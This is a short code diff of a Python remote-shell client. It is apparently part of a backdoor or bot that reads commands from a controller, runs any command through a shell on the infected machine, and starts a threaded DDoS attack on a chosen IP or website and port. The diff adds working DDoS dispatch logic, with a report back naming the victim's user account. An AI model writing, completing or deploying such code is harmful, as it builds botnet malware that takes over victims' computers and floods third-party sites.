@@ -1197,23 +1197,15 @@ def shell():
 
                 try:
                     data = str(command).split("|")
-                except:
+                    t = threading.Thread(target=attack, args=(data[1], data[2], 100000000))
+                except IndexError:
                     reliable_send("try the command in this syntax ddosattack ip,website|port")
                     # error parsing data
+                    continue
 
                 else:
-                    try:
-                        data = str(command).split("|")
-                    except IndexError:
-                        reliable_send("try the command in this syntax ddosattack ip,website|port")
-                        # error parsing data
-                        continue
-
-                    else:
-                        t = threading.Thread(target=attack, args=(data[1], data[2], 100000000))
-
-                        t.start()
-                        reliable_send("[+] attack started on " + data[1] + " from " + getpass.getuser() + " computer")
+                    t.start()
+                    reliable_send("[+] attack started on " + data[1] + " from " + getpass.getuser() + " computer")
 
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
